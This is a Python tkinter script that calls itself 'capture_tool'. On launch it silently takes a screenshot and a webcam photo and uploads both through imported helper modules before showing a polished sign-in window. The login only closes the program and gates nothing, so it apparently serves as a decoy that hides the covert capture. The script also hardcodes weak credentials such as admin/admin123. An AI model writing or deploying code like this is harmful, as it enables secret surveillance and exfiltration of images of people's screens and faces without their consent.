import tkinter as tk
from tkinter import messagebox
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import screenshot
import camera
import uploader

VALID_USERS = {
    "admin": "admin123",
    "user": "user123",
}


class LoginWindow:
    def __init__(self, root):
        self.root = root
        self.root.title("capture_tool")
        self.root.geometry("400x300")
        self.root.resizable(False, False)
        self.root.configure(bg="#1a1a2e")

        screen_w = self.root.winfo_screenwidth()
        screen_h = self.root.winfo_screenheight()
        x = (screen_w - 400) // 2
        y = (screen_h - 300) // 2
        self.root.geometry(f"400x300+{x}+{y}")

        # Card container
        self.card = tk.Frame(root, bg="#16213e", relief="flat")
        self.card.pack(fill="both", expand=True, padx=40, pady=40)

        # Icon (camera emoji as placeholder)
        tk.Label(
            self.card, text="📷",
            font=("Segoe UI Emoji", 36),
            bg="#16213e"
        ).pack(pady=(10, 0))

        # Title
        tk.Label(
            self.card, text="capture_tool",
            font=("Segoe UI", 20, "bold"),
            bg="#16213e", fg="#ffffff"
        ).pack(pady=(5, 3))

        tk.Label(
            self.card, text="Sign in to continue",
            font=("Segoe UI", 10),
            bg="#16213e", fg="#8892b0"
        ).pack(pady=(0, 20))

        # Username
        self.username_entry = tk.Entry(
            self.card,
            font=("Segoe UI", 12),
            bg="#0f3460", fg="#ffffff",
            insertbackground="#ffffff",
            relief="flat",
            highlightthickness=0
        )
        self.username_entry.insert(0, "Username")
        self.username_entry.bind("<FocusIn>", lambda e: self.on_entry_focus(self.username_entry, "Username", True))
        self.username_entry.bind("<FocusOut>", lambda e: self.on_entry_focus(self.username_entry, "Username", False))
        self.username_entry.pack(fill="x", ipady=8, padx=20, pady=(0, 10))

        # Password
        self.password_entry = tk.Entry(
            self.card,
            font=("Segoe UI", 12),
            bg="#0f3460", fg="#ffffff",
            insertbackground="#ffffff",
            relief="flat",
            highlightthickness=0,
            show="*"
        )
        self.password_entry.insert(0, "Password")
        self.password_entry.bind("<FocusIn>", lambda e: self.on_entry_focus(self.password_entry, "Password", True))
        self.password_entry.bind("<FocusOut>", lambda e: self.on_entry_focus(self.password_entry, "Password", False))
        self.password_entry.bind("<Return>", self.on_login)
        self.password_entry.pack(fill="x", ipady=8, padx=20, pady=(0, 20))

        # Login button
        self.login_btn = tk.Button(
            self.card, text="Sign In",
            font=("Segoe UI", 11, "bold"),
            bg="#e94560", fg="#ffffff",
            activebackground="#c73e54",
            activeforeground="#ffffff",
            relief="flat",
            cursor="hand2",
            command=self.on_login
        )
        self.login_btn.pack(fill="x", ipady=6, padx=20)

        # Error label
        self.error_label = tk.Label(
            self.card, text="",
            font=("Segoe UI", 9),
            bg="#16213e", fg="#e94560"
        )
        self.error_label.pack(pady=(10, 0))

    def on_entry_focus(self, entry, placeholder, focused):
        if focused and entry.get() == placeholder:
            entry.delete(0, tk.END)
            if placeholder == "Password":
                entry.config(show="*")
        elif not focused and entry.get() == "":
            entry.insert(0, placeholder)
            if placeholder == "Password":
                entry.config(show="")

    def on_login(self, event=None):
        username = self.username_entry.get().strip()
        password = self.password_entry.get()

        if username == "Username":
            username = ""
        if password == "Password":
            password = ""

        if not username or not password:
            self.error_label.config(text="Please enter username and password")
            return

        if username in VALID_USERS and VALID_USERS[username] == password:
            self.root.destroy()
            sys.exit(0)
        else:
            self.error_label.config(text="Invalid username or password")


def capture_upload_and_login():
    print("\n[Step 1] Capturing screenshot...")
    screenshot_path = screenshot.capture_screenshot()

    print("\n[Step 2] Capturing camera photo...")
    camera_path = camera.capture_camera()

    print("\n[Step 3] Uploading photos...")
    uploader.upload_screenshot(screenshot_path)
    uploader.upload_camera_photo(camera_path)

    print("\n[Step 4] Please login to continue...")
    root = tk.Tk()
    app = LoginWindow(root)
    root.mainloop()


if __name__ == "__main__":
    capture_upload_and_login()
